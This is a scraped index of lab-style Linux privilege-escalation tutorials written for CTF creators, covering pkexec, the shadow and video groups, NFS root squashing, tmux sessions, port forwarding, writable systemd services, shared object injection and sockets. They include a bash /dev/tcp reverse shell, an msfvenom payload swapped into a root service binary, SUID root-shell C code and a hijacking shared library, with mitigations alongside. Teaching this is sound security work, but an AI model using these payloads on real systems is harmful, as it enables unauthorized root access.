Pkexec binary and read its configuration: user@pwn:~$ find / -perm -4000 2\u003e/dev/null | grep pkexec /usr/bin/pkexec user@pwn:~$ cat /etc/polkit-1/localauthority.conf.d/* # Configuration file for the PolicyKit Local Authority. # # DO NOT EDIT THIS FILE, it will be overwritten on update. # # See the pklocalauthority(8) man page for more information # about configuring the Local Authority. # [Configuration] AdminIdentities=unix-user:0 [Configuration] AdminIdentities=unix-group:sudo;unix-group:admin ","date":"2021-12-28","objectID":"/linux-privesc-groups/:0:0","tags":["privilege escalation","groups","docker group","lxd group","sudo group","video group","disk group","shadow group","pkexec","wheel group","defend"],"title":"Linux Privilege Escalation - Groups for CTF Creators","uri":"/linux-privesc-groups/"},{"categories":["Linux Privilege Escalation"],"content":"GUI Spawn bash as root using pkexec: user@pwn:~$ pkexec \"/usr/bin/bash\" When using the GUI, we will get a popup window. In this window we’ll type the password of our current user: Pkexec GUI\rVerify that we’re the root user: # id uid=0(root) gid=0(root) groups=0(root) # exit ","date":"2021-12-28","objectID":"/linux-privesc-groups/:1:0","tags":["privilege escalation","groups","docker group","lxd group","sudo group","video group","disk group","shadow group","pkexec","wheel group","defend"],"title":"Linux Privilege Escalation - Groups for CTF Creators","uri":"/linux-privesc-groups/"},{"categories":["Linux Privilege Escalation"],"content":"Terminal We need two different remote sessions. In the first shell do the following. Get the current process PID: user@pwn:~$ echo $$ 20246 In the second SSH session execute this command to attach to the first SSH session using its PID: user@pwn:~$ pkttyagent --process 20246 ==== AUTHENTICATING FOR org.freedesktop.policykit.exec === Authentication is needed to run `/bin/bash' as the super user Authenticating as: user,,, (user) Password: In the first SSH session, we’ll execute pkexec pkexec \"/bin/bash\" In the second SSH session, we will be asked to authenticate to Pkexec. user@pwn:~$ pkttyagent --process 20246 ==== AUTHENTICATING FOR org.freedesktop.policykit.exec === Authentication is needed to run `/bin/bash' as the super user Authenticating as: user,,, (user) Password: ==== AUTHENTICATION COMPLETE === When the authentication is complete, we’ll go to the first SSH session and we will see a root shell: user@pwn:~$ pkexec \"/bin/bash\" root@pwn:~# id uid=0(root) gid=0(root) groups=0(root) root@pwn:~# whoami root root@pwn:~# Remove the current user from the pkexec group: sudo gpasswd -d user pkexec Reboot the system to apply the changes: reboot Privilege Escalation via Shadow Group The shadow group can read and modify the /etc/shadow file. We’ll add the current user to the shadow group: sudo usermod -aG shadow user \u0026\u0026 reboot Users from the group shadow can read the /etc/shadow file: -rw-r----- 1 root shadow 1824 May 11 10:14 /etc/shadow Remove the current user from the shadow group: sudo gpasswd -d user shadow Reboot the system to apply the change: reboot Privilege Escalation via Video Group The video group can manage video devices. Add the current user to the video group: sudo usermod -aG video user \u0026\u0026 reboot Install the required packages: sudo apt install gimp rawtherapee pnmtopng We can use this Perl script: #!/usr/bin/perl use strict; use warnings; my $w = shift || 240; my $h = shift || 320; my $pixels = $w * $h; open(my $out, \"|-\", \"pnmtopng\") or die \"Can't pipe pnmtopng: $!\\n\"; printf $out \"P6%d %d\\n255\\n\", $w, $h; while (read(STDIN, my $raw, 2) and $pixels--) { my $short = unpack('S', $raw); print $out pack(\"C3\", ($short \u0026 0xf800) \u003e\u003e 8, ($short \u0026 0x7e0) \u003e\u003e 3, ($short \u0026 0x1f) \u003c\u003c 3 ); } close $out or die \"Error closing pnmtopng: $!\\n\"; The Perl script above reads binary input from STDIN, converts it to a PNG image using pnmtopng, and outputs the resulting image. Add execution permissions to the script: chmod +x iraw2png.pl Create a screenshot for fb0 by changing the TTY Ctrl+Alt+F3: echo 'The password of the root user is: pass123' Using the command w we can find who is logged on the system and it will show an output like the focusing one: user@pwn:~/Desktop$ w Now capture the screenshot: cat /dev/fb0 \u003e /home/user/screenshot.raw List the file /tmp: ls -l /tmp/screenshot.raw TTY3 Video Group\rClick this button in VMware or just do Ctrl+Alt+Delete: VMware Alt+Del\rWe can view the files that the video group has: user@pwn:~/raw2png$ find / -group video 2\u003e/dev/null /dev/dri/card0 /dev/fb0 user@pwn:~/raw2png$ The video group has access to view the screen output. we can observe the screens. To do that we need to grab the current image on the screen in raw data and get the resolution that the screen is using. The screen data can be saved in /dev/fb0 and we could find the resolution of this screen on /sys/class/graphics/fb0/virtual_size user@pwn:~$ cat /sys/class/graphics/fb0/virtual_size 2048,2048 Then convert this to png: user@pwn:~$ ./iraw2png.pl 2048 2048 \u003c /home/user/screenshot.raw \u003e screenshot.png pnmtopng: 5 colors found Now open the image: iraw2png Open Image\rAlternatively, we can open the raw image with GIMP, and select the screen.raw file and select as file type Raw image data: GIMP Raw\rAdd the resolution size found in cat /sys/class/graphics/fb0/virtual_size and select the Image Type: GIMP Image Type\rNow we can see it in GIMP: GIMP Video Group\rSince we can see the password, we can escalate privileges by changing to the root us","date":"2021-12-28","objectID":"/linux-privesc-groups/:2:0","tags":["privilege escalation","groups","docker group","lxd group","sudo group","video group","disk group","shadow group","pkexec","wheel group","defend"],"title":"Linux Privilege Escalation - Groups for CTF Creators","uri":"/linux-privesc-groups/"},{"categories":["Linux Privilege Escalation"],"content":"NFS Root squash is an NFS feature that maps the remote root user (UID 0) to a local user with minimal privileges, typically the nobody user (UID 65534). This prevents remote root users from having root privileges on the NFS server, enhancing security. The NFS configuration file is /etc/exports. Here are the relevant options: no_root_squash: This option disables root squash, allowing the root user on the client to access files on the NFS server as root. This can be risky, as it allows the creation of malicious files on the NFS share with root privileges. no_all_squash: This option is similar to no_root_squash but applies to non-root users, preventing their UIDs from being mapped to the nobody user. Privilege Escalation via NFS Root Squashing On the victim machine we’ll find the directory in which NFS is hosting files: cat /etc/exports On your adversary host, we’ll install the NFS client package: sudo apt install nfs-common In our adversary host, we’ll create a directory to host the NFS share: mkdir /tmp/nfs In our adversary host, we will mount the remote share in the /tmp/nfs directory of our adversary host, make sure to run this command with sudo. sudo mount -o rw,vers=2 10.10.10.14:/tmp /tmp/nfs The following error means that we don’t have permission to mount the share, try it with sudo instead. mount.nfs: failed to apply fstab options The following error means that we need to try another protocol version. mount.nfs: Protocol not supported Alternatively, we can mount it this way: sudo mount -t nfs 10.10.10.14:/tmp /tmp/nfs If we receive the error down by the user: mount: /tmp/nfs: bad option; for several file systems (e.g. nfs) we might need a /sbin/mount. This means that we don’t have an NFS client installed: sudo apt install nfs-common Once the share is mounted we can attempt to create a payload. We can create a bash binary with a SUID bit: sudo cp /bin/bash /tmp/nfs/bash \u0026\u0026 sudo chmod u+s /tmp/nfs/bash Another payload that we can use is a custom C code: #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { setresuid(0, 0, 0); setuid(getuid()); system(\"/usr/bin/bash\"); return 0; } Compile this payload and remove any existing if any, then copy the payload to the share: gcc payload.c -o payload \u0026\u0026 sudo rm /tmp/nfs/payload 2\u003e/dev/null; sudo cp payload /tmp/nfs Add the SUID bit to the payload executable: sudo chmod u+s /tmp/nfs/payload Now in the victim host, we can execute any of the previous payloads to escalate privileges: user@pwn:/tmp$ ls -l total 1296 -rwsr-xr-x 1 root root 1230280 Dec 1 09:03 bash -rwsr-xr-x 1 root root 16232 Dec 1 09:05 payload user@pwn:/tmp$ ./bash -p bash-5.1# whoami root bash-5.1# exit user@pwn:/tmp$ ./payload root@pwn:/tmp# id uid=0(root) gid=1000 (user) \u003c...SNIP...\u003e Once we’re done we can unmount the shared directory in our adversary host: sudo umount /tmp/nfs ","date":"2021-12-28","objectID":"/linux-privesc-nfs-root-squashing/:0:0","tags":["privilege escalation","nfs","root_squashing","defend"],"title":"Linux Privilege Escalation - NFS Root Squashing for CTF Creators","uri":"/linux-privesc-nfs-root-squashing/"},{"categories":["Linux Privilege Escalation"],"content":"Open Shell Sessions A terminal session represents an interaction with a terminal for software or an operating system. In UNIX systems, these sessions are stored as socket files and character files. If a terminal session has read, write, and execute permissions, it is possible to attach to the session. Programs such as GNU screen and tmux facilitate the management of terminal sessions and are known as terminal multiplexers. Privilege Escalation via Screen List the screen sessions directory recursively: ls -lR /var/run/screen 2\u003e/dev/null Change the group of the directory to your group recursively: sudo chgrp user -R /var/run/screen/S-root/ Add read, write, and execute permissions to your group recursively: sudo chmod g+rwx -R /var/run/screen/S-root/ As we can see below the GNU screen program is aware of this misconfiguration so it doesn’t let we create this privilege escalation attack vector: user@pwn:~$ sudo screen -ls Directory /run/screen/S-root must have mode 700. Change the permissions to the one that it must have: user@pwn:~$ sudo chmod 700 -R /var/run/screen/S-root/ user@pwn:~$ sudo screen -ls There is a screen on: 6848.pts-0.ubuntu (12/04/2021 04:55:50 PM) (Attached) 1 Socket in /run/screen/S-root. If we try to add read, write, and execute permissions to the session file: user@pwn:~$ sudo chmod 770 /var/run/screen/S-root/6848.pts-0.ubuntu user@pwn:~$ sudo ls -la /var/run/screen/S-root/ total 0 drwx------ 2 root user 60 Dec 04 15:53 . drwxrwxrwt 4 root utmp 80 Dec 04 15:53 .. srwxrwx--- 1 root user 0 Dec 04 15:53 6848.pts-0.ubuntu We can see that the file is not found: user@pwn:~$ screen -dr 6848.pts-0.ubuntu There is no screen to be detached matching 6848.pts-0.ubuntu. user@pwn:~$ sudo screen -dr 6848.pts-0.ubuntu There is a screen on: 6848.pts-0.ubuntu (12/04/2021 04:55:50 PM) (Unknown) There is no screen to be detached matching 6848.pts-0.ubuntu. The only way as of this year (2021) to escalate privileges with GNU Screen is by using an old version or vulnerable version like GNU Screen 4.5.0 - Local Privilege Escalation. Privilege Escalation via Tmux Let’s create a scenario where the current session is misconfigured, startup by creating a shared session, this is done by creating a socket file: sudo tmux -S /shared new -s session Then create a new terminal window or tab and change the group of the shared socket file to a group that we belong: sudo chown root:user /shared If we can compromise a user in the user group, we can attach to this session and gain root access. Since the owner of the socket file is root and the user we compromised is in the group user: user@pwn:~$ ls -l /shared srwxrwx--- 1 root user 0 Dec 27 16:42 /shared Review our group membership with the id command or the groups commands, I’m going to execute both commands: user@pwn:~$ id \u0026\u0026 echo '' \u0026\u0026 groups uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare) user adm cdrom sudo dip plugdev lpadmin lxd sambashare As we can see above, we’re in the user group and the user group has read, write, and execute permission in the shared socket session file. Because of this misconfiguration, we can attach to the tmux session. user@pwn:~$ tmux -S /shared Confirm the root privileges with id command to see the uid or we can use the whoami command to print the euid. The important thing here is that either or both the uid or the euid is 0 (root): root@pwn:/home/user# id uid=0(root) gid=0(root) groups=0(root) root@pwn:/home/user# whoami root root@pwn:/home/user# In old versions of tmux, we could attach to any session so if you’re in a system with an old tmux version running it is worth a try to attach to that session. ","date":"2021-12-28","objectID":"/linux-privesc-open-shell-sessions/:0:0","tags":["privilege escalation","shared object injection","defend"],"title":"Linux Privilege Escalation - Open Shell Sessions for CTF Creators","uri":"/linux-privesc-open-shell-sessions/"},{"categories":["Linux Privilege Escalation"],"content":"Port Forwarding When there’s a service listening on localhost and not externally, it doesn’t mean that we cannot access this service. Port forwarding as it name implies it allow us to foward a port to another socket. If this particular service is vulnerable to anything related an elevation of privilege, then it can be used as an elevation path. Apache2 Scenario Install apache2 with apt: sudo apt install apache2 Configure the apache2 listening ports: user@pwn:~$ cat /etc/apache2/ports.conf # If you just change the port or add more ports here, you will likely also # have to change the VirtualHost statement in # /etc/apache2/sites-enabled/000-default.conf Listen 127.0.0.1:80 \u003cIfModule ssl_module\u003e Listen 127.0.0.1:443 \u003c/IfModule\u003e \u003cIfModule mod_gnutls.c\u003e Listen 127.0.0.1:443 \u003c/IfModule\u003e # vim: syntax=apache ts=4 sw=4 sts=4 sr noet Enable the service, restart the service, and check its status: sudo systemctl enable apache2 \u0026\u0026 sudo systemctl restart apache2 \u0026\u0026 sudo systemctl status apache2 Check if port 80 is listening on the loopback interface: user@pwn:~$ ss -tnlp | grep 80 LISTEN 0 511 127.0.0.1:80 0.0.0.0:* The options above are the following: -t: Display TCP sockets. -n: Do not try to resolve service names. -l: Display only listening sockets -p: Show process using socket. Verify if it’s working by going to the browser and opening the localhost URL http://localhost:80. Do a nmap scan from an attacker host to prove that’s listening only on localhost: ❯ sudo nmap -p80 192.168.146.131 [sudo] password for pwnlog: ...\u003cSNIP\u003e... PORT STATE SERVICE 80/tcp closed http MAC Address: 00:0C:29:6A:00:F9 (VMware) Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds As you can see the port is closed externally. Privilege Escalation via Local Port Forwarding Local Port Forwarding means forwarding the port that’s listening on the target host loopback interface to our host. This is done by connecting to the target host. Local: Connect to the target host from your adversary host. This technique involves forwarding the port that’s listening on the loopback interface in the target/victim host to our remote host: user@parrot:~$ ssh -L \u003cyour-port\u003e:127.0.0.1:\u003cport-to-forward\u003e user@\u003ctarget-ip\u003e user@parrot:~$ ssh -L 9898:127.0.0.1:80 user@192.168.146.131 After authenticating successfully to the target host. We can see that our adversary host now has established a socket: ❯ ss -tlnp | grep 9898 LISTEN 0 128 127.0.0.1:9898 0.0.0.0:* users:((\"ssh\",pid=491131,fd=5)) LISTEN 0 128 [::1]:9898 [::]:* users:((\"ssh\",pid=491131,fd=4)) In our adversary host, we can enumerate the response headers to see if the Server header indicates that is running Apache2 in Ubuntu: ❯ curl -I http://localhost:9898 HTTP/1.1 200 OK Date: Tue, 20 Dec 2021 20:26:08 GMT Server: Apache/2.4.41 (Ubuntu) Last-Modified: Tue, 20 Dec 2021 00:11:10 GMT ETag: \"2aa6-5d429a897fe9c\" Accept-Ranges: bytes Content-Length: 10918 Vary: Accept-Encoding Content-Type: text/html As we can see from the output above we have successfully forwarded port 80 from the target machine (Ubuntu) to our adversary host on port 9898 (ParrotOS/Kali Linux). When we’re done we can close this connection by exiting the SSH session. Privilege Escalation via Remote Port Forwarding Remote Port Forwarding means forwarding the port that’s listening on the target host loopback interface to our host. This is done by connecting to our host from the target host. Remote: Connect to your adversary host from the target host. This technique involves forwarding the port that’s listening on the loopback interface in the target/victim host to our remote host: user@victim-host:~$ ssh -R \u003cyour-port\u003e:localhost:\u003cport-to-forward\u003e your_username@your_adversary_host_IP user@pwn:~$ ssh -R 9999:localhost:80 user@10.10.10.14 Now go to your adversary host and verify that port 9999 is listening on your localhost: ❯ echo \"This host is `hostname`\" \u0026\u0026 echo '' \u0026\u0026 ss -tnlp | grep 9999 This host is kali LISTEN 0 128 127.0.0.1:9999 0.0.0.0:* LISTEN 0 128 [","date":"2021-12-28","objectID":"/linux-privesc-port-forwarding/:0:0","tags":["privilege escalation","ssh","local port forwarding","remote port forwarding","dynamic port forwarding","defend"],"title":"Linux Privilege Escalation - Port Forwarding for CTF Creators","uri":"/linux-privesc-port-forwarding/"},{"categories":["Linux Privilege Escalation"],"content":"Services Services are programs that run in the background waiting to be used or carrying out some tasks. Service configuration files should never be writable by other users. Programs used by service configuration files should never be writable by other users. Some programs that are running as a service may be vulnerable. ","date":"2021-12-28","objectID":"/linux-privesc-services/:0:0","tags":["privilege escalation","services","systemd.path","writable executables","writable services","defend"],"title":"Linux Privilege Escalation - Services for CTF Creators","uri":"/linux-privesc-services/"},{"categories":["Linux Privilege Escalation"],"content":"Service Configuration Files The service configuration files end with .service and define how services are managed by the operating system. If you can write to any .service file, as an attacker you could modify it so it executes a backdoor when the service is started, restarted or stopped(sometimes you will need to wait until the machine is rebooted if you don’t have privileges to reboot the machine). For more information regarding units read this tutorial. The multi-user.target means that the systemd-service will start when the system reaches runlevel 2. Here’s a table of the targets and their run levels: Run Level Target Units Description 0 runlevel0.target, poweroff.target Shut down and power off 1 runlevel1.target, rescue.target Set up a rescue shell 2,3,4 runlevel[234].target, multi-user.target Set up a non-gfx multi-user shell 5 runlevel5.target, graphical.target Set up a gfx multi-user shell 6 runlevel6.target, reboot.target Shut down and reboot the system Privilege Escalation via Writable .service files If we can write any .service file, we could modify it so it executes your backdoor when the service is started, restarted or stopped. We’ll create a service configuration file: sudo vim /etc/systemd/system/name.service [Unit] Description=Misconfigured service config [Service] Type=basic ExecStart=/usr/bin/rsync [Install] WantedBy=multi-user.target We’ll add write permissions to the service so that other users can write to this file: sudo chmod o+w /etc/systemd/system/name.service We can create simple payload: echo -e '#!/bin/bash\\n\\nbash -i \u003e\u0026 /dev/tcp/10.10.10.15/1234 0\u003e\u00261' \u003e\u003e /tmp/script.sh We’ll add execution permissions: chmod +x /tmp/script.sh Modify the ExecStart variable which we’ll hold the script absolute path: ExecStart=/tmp/script.sh Since this service is configured to run as the root user. The payload will be executed under the security context of the root user. sudo systemctl restart name.service We’ll then receive a connection as the root user: nc -lvnp 1234 We can mitigate this risk by removing the other writable permissions: sudo chmod o-w /etc/systemd/system/name.service Privilege Escalation via Writable service binaries If we have write permissions over binaries being executed by services, we can change them for backdoors so that when the services get re-executed the backdoors will be executed. When a binary has writable permissions, we can just replace the binary: user@pwn:~$ which rsync /usr/bin/rsync user@pwn:~$ ls -l /usr/bin/rsync -rwxr-xr-x 1 root root 516760 Oct 14 2019 /usr/bin/rsync user@pwn:~$ sudo chmod o+w /usr/bin/rsync Create a backup of the original binary: cp /usr/bin/rsync /tmp/rsync.bak Generate a reverse shell payload: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.15 LPORT=53 -f elf -o rev_shell Transfer the file to the target: sudo python3 -m http.server 80 cd /dev/shm wget 10.10.10.15/rev_shell -O rev_shell Add execute permissions: chmod +x rev_shell Replace the original binary with the reverse shell payload: cp /dev/shm/rev_shell /usr/bin/rsync Setup a listener: sudo nc -lvnp 53 Since this service is configured to run as the root user. The payload will be executed under the security context of the root user. systemctl restart name.service Then we’ll a receive a shell as the root user: sudo nc -lvnp 53 Afterwards, we can restore the backup: cp /tmp/rsync.bak /usr/bin/rsync Remove the binary writable permissions: sudo chmod o-w /usr/bin/rsync Privilege Escalation via systemd PATH We can see the path environment variable used by systemd with the following command: systemctl show-environment We’ll then verify if we have write permissions in any of the previous directories before the /usr/bin directory: ❯ systemctl show-environment | grep PATH | cut -d '=' -f 2 | tr ':' '\\n' /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin systemctl show-environment | grep PATH | cut -d '=' -f 2 | tr ':' '\\n' | xargs ls -dl Here is how this works: Systemd PATH Image\rWe’ll append wri","date":"2021-12-28","objectID":"/linux-privesc-services/:1:0","tags":["privilege escalation","services","systemd.path","writable executables","writable services","defend"],"title":"Linux Privilege Escalation - Services for CTF Creators","uri":"/linux-privesc-services/"},{"categories":["Linux Privilege Escalation"],"content":"Libraries A library is a file containing compiled code that is used by developers to avoid re-writing the same pieces of code used in multiple programs; this is often known as modular programming. It can contain classes, methods or data structures and will be linked to the program that will use it at the compilation time. There are two main types of libraries in Linux: Static libraries (.a extension) Dynamic or shared libraries (.so extension) ","date":"2021-12-28","objectID":"/linux-privesc-so-injection/:0:0","tags":["privilege escalation","shared object injection","libraries","static libraries","dynamic libraries","gnu linker","ld","strace","c payloads","suid","defend"],"title":"Linux Privilege Escalation - Shared Object Injection for CTF Creators","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Static Libraries Static libraries will become part of the program so they will be unalterable once the compilation is done. This means that the running program has its own copy of the library, which won’t be interesting to us, since we cannot do anything. ","date":"2021-12-28","objectID":"/linux-privesc-so-injection/:1:0","tags":["privilege escalation","shared object injection","libraries","static libraries","dynamic libraries","gnu linker","ld","strace","c payloads","suid","defend"],"title":"Linux Privilege Escalation - Shared Object Injection for CTF Creators","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Dynamic Libraries Dynamic libraries can be used in two ways: Dynamic linking (dynamically linked, where a program is linked with the shared library and the kernel loads the library if it’s not in memory upon execution). Dynamic loading (dynamically loaded, the program takes full control by calling functions with the library). If we manage to alter the content of a dynamic library, we should be able to control the execution of the calling program and that’s what we want! ","date":"2021-12-28","objectID":"/linux-privesc-so-injection/:2:0","tags":["privilege escalation","shared object injection","libraries","static libraries","dynamic libraries","gnu linker","ld","strace","c payloads","suid","defend"],"title":"Linux Privilege Escalation - Shared Object Injection for CTF Creators","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Dynamic Linking Since these libraries are dynamically linked to the program, the operating system needs to know where to look for these libraries because if the operating system doesn’t know where the libraries are located, then it won’t find them and therefore, the libraries will not be executed, resulting in an error. To solve this we can create dynamic links and do that we can use the GNU linker. ld is the GNU linker. ","date":"2021-12-28","objectID":"/linux-privesc-so-injection/:3:0","tags":["privilege escalation","shared object injection","libraries","static libraries","dynamic libraries","gnu linker","ld","strace","c payloads","suid","defend"],"title":"Linux Privilege Escalation - Shared Object Injection for CTF Creators","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"ld - The GNU Linker The following methods can be used for specifying the location of dynamic libraries: The -rpath or -rpath-link options when compiling the application. The environment variable LD_RUN_PATH. The environment variable LD_LIBRARY_PATH. The value of DT_RUNPATH or DT_PATH. Placing libraries in the default /lib or /usr/lib directories. Specifying a directory containing our libraries in /etc/ld.so.conf. ","date":"2021-12-28","objectID":"/linux-privesc-so-injection/:4:0","tags":["privilege escalation","shared object injection","libraries","static libraries","dynamic libraries","gnu linker","ld","strace","c payloads","suid","defend"],"title":"Linux Privilege Escalation - Shared Object Injection for CTF Creators","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Default Mitigations As an attacker, our objective is to control one of the methods mentioned before in order to replace an existing dynamic library with a malicious one.However, by default, security measures have been put in place in Linux. This is not the end. In this article, we will see that there are so many ways to make this privilege escalation vector possible. ","date":"2021-12-28","objectID":"/linux-privesc-so-injection/:5:0","tags":["privilege escalation","shared object injection","libraries","static libraries","dynamic libraries","gnu linker","ld","strace","c payloads","suid","defend"],"title":"Linux Privilege Escalation - Shared Object Injection for CTF Creators","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Shared Object Injection Shared libraries are libraries that are loaded by programs when they start. If we can write or replace a shared library that is used by a SUID binary/program. As an attacker, we can create some malicious code and the program that loads the shared library will also execute the code that we create. In other words, shared object libraries can be injected or hijacked during a program execution. We could import malicious shared object to elevate privileges in a system. ","date":"2021-12-28","objectID":"/linux-privesc-so-injection/:6:0","tags":["privilege escalation","shared object injection","libraries","static libraries","dynamic libraries","gnu linker","ld","strace","c payloads","suid","defend"],"title":"Linux Privilege Escalation - Shared Object Injection for CTF Creators","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Dynamically Loaded Libraries Search Order This is the order in which programs look for shared object files: The directories in the LD_LIBRARY_PATH environment variable. The directories specified in /etc/ld.so.cache which is generated from the configuration file which is /etc/ld.so.conf. Lastly, we have the /lib directory, which is a symbolic link to /usr/lib. Note: This is the order for this article; there are other ways in which you can compile your program and may alter the search order. If you want to know the search order for you, read the description of the man page (ld.so) Setting Up The Workspace Install the required packages for this video: user@pwn:~$ sudo apt update \u0026\u0026 sudo apt install -y vim gcc Now clear the screen: user@pwn:~$ clear Let’s start by creating a working directory: user@pwn:~$ mkdir so-files user@pwn:~$ cd !$ cd so-files user@pwn:~/so-files$ We’ll create a file named libcustom.c: user@pwn:~/so-files$ vim libcustom.c This print a message and nothing more: #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e void say_hi(){ printf(\"Message from libcustom.c\\n\"); } Then we’ll create a header file named libcustom.h, which is the header file: user@pwn:~/so-files$ vim libcustom.h This code calls an external function, in this case, the function called say_hi: #ifndef say_hi_h__ #define say_hi_h__ extern void say_hi(void); #endif // say_hi_h__ Now we will write and create a program that simply prints a message. I will name this file as myexec.c: user@pwn:~/so-files$ vim myexec.c This code imports the libcustom.h header file, the main() function prints a message and executes the say_hi() function which is found in the header file libcustom.h and if the execution is successful it returns a status code of (0): #include \u003cstdio.h\u003e #include \"libcustom.h\" int main(){ printf(\"Message from myexec.c!\\n\"); say_hi(); return 0; } Now create a new directory named evil and navigate there, this is where the malicious library will be placed: user@pwn:~/so-files$ mkdir evil user@pwn:~/so-files$ cd !$ cd evil user@pwn:~/so-files/evil$ Lastly, we’ll create the code that will be included in the malicious library file. I’ll name this file as libcustom.c: user@pwn:~/so-files/evil$ vim libcustom.c This code sets the UID (0) which is the UID of the root user. Then it sets the GID of (0) which is the root group. The next three lines print a message of their own. The last line spawns a bash shell: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e void say_hi(){ setuid(0); setgid(0); printf(\"I'm the bad library!\\n\"); printf(\"I'm trying to spawn a root shell...\\n\"); printf(\"Check your shell!\\n\"); system(\"/bin/bash\"); } Now copy the original header file to our current working directory: user@pwn:~/so-files/evil$ cp ../libcustom.h . user@pwn:~/so-files/evil$ ls libcustom.c libcustom.h Let’s create the malicious shared object: user@pwn:~/so-files/evil$ gcc -c -Wall -Werror -fPIC libcustom.c user@pwn:~/so-files/evil$ gcc -shared -o libcustom.so libcustom.o user@pwn:~/so-files/evil$ ls -l total 28 -rw-rw-r-- 1 user user 281 Dec 10 12:13 libcustom.c -rw-rw-r-- 1 user user 88 Dec 10 12:14 libcustom.h -rw-rw-r-- 1 user user 2104 Dec 10 12:14 libcustom.o -rwxrwxr-x 1 user user 16360 Dec 10 12:14 libcustom.so Now go back to the main directory: user@pwn:~/so-files/evil$ cd ~/so-files This creates an object file: user@pwn:~/so-files$ gcc -c -Wall -Werror -fPIC libcustom.c Then create a shared object file: user@pwn:~/so-files$ gcc -shared -o libcustom.so libcustom.o Copy the shared object to the library directory: user@pwn:~/so-files$ sudo cp libcustom.so /usr/lib/ Finally, compile the program: user@pwn:~/so-files$ gcc -Wall -o myexec myexec.c -lcustom Then we can confirm how this is loading the library with ldd: user@pwn:~/so-files$ ldd ./myexec linux-vdso.so.1 (0x00007ffcb9571000) libcustom.so =\u003e /lib/libcustom.so (0x00007f74a1d09000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f74a1b17000) /lib64/ld-l","date":"2021-12-28","objectID":"/linux-privesc-so-injection/:7:0","tags":["privilege escalation","shared object injection","libraries","static libraries","dynamic libraries","gnu linker","ld","strace","c payloads","suid","defend"],"title":"Linux Privilege Escalation - Shared Object Injection for CTF Creators","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Sockets A Unix-domain socket allows communication between two different processes on the same machine or different machines in client-server application frameworks. It facilitates inter-process communication using standard Unix file descriptors. Sockets can be configured using .socket files. For more information regarding sockets, refer to the systemd.socket man page. Information regarding special systemd units can be found on the systemd.special man page. Note that SOCK_SEQPACKET (i.e. ListenSequentialPacket=) is only available for AF_UNIX sockets. SOCK_STREAM (i.e. ListenStream=) when used for IP sockets refers to TCP sockets, SOCK_DGRAM (i.e. ListenDatagram=) to UDP. Understanding Sockets Install socat with the apt package manager: sudo apt update \u0026\u0026 sudo apt install socat Let’s create a socket file: sudo vim /lib/systemd/system/echo.socket In this case, we’re going to create an echo socket and use only a listening directive and the Accept directive: [Unit] Description = Echo server [Socket] ListenStream = 4444 Accept = yes [Install] WantedBy = sockets.target Options: ListenStream: means SOCK_STREAM and when used for IP sockets refers to TCP sockets. Accept: Takes a boolean argument. If yes, a service instance is spawned for each incoming connection and only the connection socket is passed to it. If no, all listening sockets themselves are passed to the started service unit, and only one service unit is spawned for all connections. Since we want to send information from one machine to another, you will be using an AF_INET, and for that the best thing to do is have Accept set to true or yes. WantedBy=sockets.target: A special target unit that sets up all socket units (see systemd.socket(5) for details) that shall be active after boot. Services that can be socket-activated shall add Wants= dependencies to this unit for their socket unit during installation. This is best configured via a WantedBy=sockets.target in the socket unit’s [Install] section. Create a service file. In most cases, the service will have the same name as the socket unit, except with an @ and the service suffix. As your socket unit was echo.socket, your service will be echo@.service: sudo vim /etc/systemd/system/echo@.service The service itself is also pretty basic: [Unit] Description=Echo server service [Service] ExecStart=/home/low/echo_write.py StandardInput=socket The service Type is simple, which is already the default, so there is no need to include it. \"ExecStart” points to the echo_write.py script you will see in a minute, and the \"StandardInput\" for said script comes from the socket set up by echo.socket. Let’s see where python is located: user@pwn:~$ which python user@pwn:~$ which python3 /usr/bin/python3 Create a script: vim echo_write.py The echo_write.py script is just three lines long: #!/usr/bin/python3 import sys sys.stdout.write(sys.stdin.readline().strip().upper() + '\\n') This reads a line of text from STDIN, which, as you can see, is accessed through the socket. 'sys.stdin.readline().strip()’ then removes all spaces from the beginning and end of the line and converts it to uppercase .upper(). It then transmits it back through the socket to the transmitting computer’s terminal ('sys.stdout.write([...])'). This means that a user can connect to the socket on your receiving system, write a string, and have it repeated back in upper case. Add execution permissions: chmod +x echo_write.py Start the socket unit with: sudo systemctl start echo.socket The echo.socket will automatically call echo@.service (which runs echo_write.py) each time someone tries to push a string to the server through port 4444. Now check that the port listening: user@pwn:~$ ss -tnlp | grep 4444 LISTEN 0 4096 *:4444 *:* To do that, on the sending computer, you can use a program like socat: $ socat - TCP:127.0.0.1:4444 hello HELLO $ PrivilegeEscalation via Writable .socket files Let’s add write permissions for others: sudo chmod o+w echo.socket If we find a writable .socke","date":"2021-12-28","objectID":"/linux-privesc-sockets/:0:0","tags":["privilege escalation","sockets","socket configuration files","sockets command injection","defend"],"title":"Linux Privilege Escalation - Sockets for CTF Creators","uri":"/linux-privesc-sockets/"},{"categories":["Linux Privilege Escalation"],"content":"SSH SSH allows us to establish an encrypted remote or local connection to a terminal. Depending on how the SSH service is configured we may be able to log in as another user or even the root user by one of these methods: Private Keys Agent Forwarding Credentials There are a numbers of ways that SSH can be used to elevate privileges on a system. Ranging from SSH keys to SSH agents. Privilege Escalation via SSH Private Keys First, let’s make sure that we can log in as root by reading the SSH configuration file: user@pwn:~$ grep PermitRootLogin /etc/ssh/sshd_config #PermitRootLogin prohibit-password # the setting of 